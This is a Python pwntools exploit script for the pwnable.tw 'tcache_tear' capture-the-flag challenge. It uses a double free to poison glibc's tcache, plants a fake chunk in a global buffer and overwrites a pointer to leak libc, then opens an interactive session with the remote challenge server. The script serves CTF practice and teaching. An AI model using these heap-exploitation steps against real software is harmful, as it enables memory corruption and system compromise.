#!/usr/bin/env python3

from pwn import *
import logging

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = logging.ERROR
context.terminal = ['tmux', 'splitw', '-h']

def rs(delim, line):
    print(r.readuntil(delim).decode()) 
    r.sendline(line)

def malloc(size, data):
    rs(b':', b'1')
    rs(b':', str(size).encode())
    rs(b':', data)

def free():
    rs(b':', b'2')

def info():
    rs(b':', b'3')

def exit():
    rs(b':', b'4')

def conn():
    if local:
        if debug:
            r = gdb.debug([exe.path], '''
set follow-fork-mode child
b *0x400b54
c
            ''')
        else:
            r = process([exe.path])
    else:
        r = remote("chall.pwnable.tw", 10207)
    return r

def main():
    # double free on ptr
    # heap overflow due to integer underflow

    '''
    info leak: what happens when we free the memory at 0x602060?
    if it gets added to doubly linked list (smallbin), it may leak pointers


    to get added to smallbin, i think the size has to be pretty big

    make a fake free chunk inside global string.
    overwrite ptr to point to the fake chunk.
    then free it, leaking a libc pointer.

    | fake chunk | ... | ptr | ... | next chunk |
    '''

    global r, local, debug
    local, debug = input('local? '), input('debug? ')
    local = local.lower().strip() == 'y'
    debug = debug.lower().strip() == 'y'

    r = conn()
    GLOBAL_STR = 0x602060
    PTR = 0x602088
    CHUNK_SIZE = 2032

    rs(b':', b'A'*8 + p64(CHUNK_SIZE | 1))

    # malloc, free, info, exit
    malloc(8, b'')
    free()
    free()
    # head->A->A

    malloc(8, p64(GLOBAL_STR+16))
    # head->A->global+8

    malloc(8, b'')
    malloc(8, b'A'*(PTR-GLOBAL_STR-16) + p64(GLOBAL_STR+16))

    # free()

    r.interactive()


if __name__ == "__main__":
    main()
